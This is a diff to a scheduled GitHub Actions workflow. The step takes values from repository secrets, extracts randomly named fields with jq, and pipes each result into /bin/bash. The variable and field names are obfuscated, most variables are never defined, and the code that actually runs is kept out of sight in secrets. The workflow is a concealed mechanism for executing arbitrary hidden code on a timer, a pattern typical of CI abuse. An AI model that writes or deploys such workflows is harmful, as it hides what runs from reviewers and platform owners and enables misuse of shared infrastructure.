@@ -2,18 +2,27 @@ name: shilindongxing
 on:
   workflow_dispatch:
   schedule:
-    - cron: '10 2/6 * * *'
+    - cron: '19 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: shilindongxing
         env:
-          a17: ${{ secrets.a17 }}
+          r0: ${{ secrets.r0 }}
         run: |
-          echo $a17 | jq -r .fpaf566 | /bin/bash
-          echo $ntl9 | jq -r .vroy2791 | /bin/bash
-          echo $w75 | jq -r .egsio5 | /bin/bash
-          echo $dxtoh602 | jq -r .wgst1 | /bin/bash
+          echo $r0 | jq -r .h029 | /bin/bash
+          echo $tll80 | jq -r .bsod7 | /bin/bash
+          echo $fbx32949 | jq -r .etrdy234 | /bin/bash
+          echo $a8309 | jq -r .r76 | /bin/bash
+          echo $ywqv60613 | jq -r .lgi31 | /bin/bash
+          echo $zyx0590 | jq -r .fy8003 | /bin/bash
+          echo $s373 | jq -r .e6259 | /bin/bash
+          echo $rg9 | jq -r .lgir98089 | /bin/bash
+          echo $oz4 | jq -r .qli9 | /bin/bash
+          echo $fiix68 | jq -r .lfnw70 | /bin/bash
+          echo $yie1 | jq -r .l67 | /bin/bash
 
